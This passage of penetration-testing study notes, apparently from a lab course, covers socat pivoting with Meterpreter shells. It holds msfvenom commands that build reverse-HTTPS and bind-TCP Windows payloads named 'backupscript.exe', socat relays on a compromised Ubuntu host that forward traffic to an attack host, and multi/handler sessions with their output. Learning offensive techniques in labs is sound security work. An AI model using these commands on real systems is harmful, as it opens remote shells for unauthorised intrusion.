![Screenshot_3](https://github.com/kiro6/penetration-testing-notes/assets/57776872/139f0117-4f36-436d-b4e2-29a9a58f1cec)


## Socat Redirection with a Reverse Shell

### Starting Socat Listener
Socat will listen on localhost (pivot server) on port 8080 and forward all the traffic to port 80 on our attack host (10.10.14.18). 
```shell
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

### Creating the Windows Payload
```shell
$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```
### Configuring & Starting the multi/handler
```shell
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 80
lport => 80
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:80
```

## Socat Redirection with a Bind Shell
- In the case of bind shells, the Windows server will start a listener and bind to a particular port. We can create a bind shell payload for Windows and execute it on the Windows host. 
- At the same time, we can create a socat redirector on the Ubuntu server, which will listen for incoming connections from a Metasploit bind handler and forward that to a bind shell payload on a Windows target.

### Creating the Windows Payload
```shell
$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
```
### Starting Socat Bind Shell Listener
```shell
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

### Configuring & Starting the Bind multi/handler
```shell
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 10.129.202.64
RHOST => 10.129.202.64
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 10.129.202.64:8080
```
